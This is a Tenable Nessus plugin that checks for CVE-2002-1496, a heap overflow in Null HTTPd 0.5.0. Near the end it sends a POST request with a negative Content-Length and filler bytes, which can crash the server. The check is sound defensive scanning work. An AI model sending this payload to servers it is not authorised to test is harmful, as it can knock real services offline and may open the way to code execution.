#
# (C) Tenable Network Security, Inc.
#

########################
# References:
########################
#
# Date:  Sun, 22 Sep 2002 23:19:48 -0000
# From: "Bert Vanmanshoven" <sacrine@netric.org>
# To: bugtraq@securityfocus.com
# Subject: remote exploitable heap overflow in Null HTTPd 0.5.0
#
########################
#
# Vulnerables:
# Null HTTPD 0.5.0
#

include( 'compat.inc' );

if(description)
{
 script_id(11183);
 script_version("$Revision: 1.12 $");
 script_cve_id("CVE-2002-1496");
 script_bugtraq_id(5774);
 script_xref(name:"OSVDB", value:"9212");

 script_name(english:"Null httpd Content-Length Header Handling Remote Overflow");
 script_summary(english:"NullLogic Null HTTP Server Negative Content-Length Heap Overflow");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is prone to a heap based buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The NullLogic Null HTTPd web server crashed when sent an
invalid POST HTTP request with a negative Content-Length field.

An attacker may exploit this flaw to disable your service or
even execute arbitrary code on your system."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade your NullLogic Null HTTPd to version 0.5.1 or later."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/2002-09/0284.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P'
  );

  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl", "httpver.nasl");
 script_require_ports("Services/www",80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
include("global_settings.inc");
include("http_func.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);


soc = http_open_socket(port);
if (! soc) exit(0);

# Null HTTPD attack
req = string("POST / HTTP/1.0\r\nContent-Length: -800\r\n\r\n", crap(500), "\r\n");
send(socket:soc, data: req);
r = http_recv(socket: soc);
http_close_socket(soc);


#
if(http_is_dead(port: port, retry: 3))
{
  security_hole(port);
}
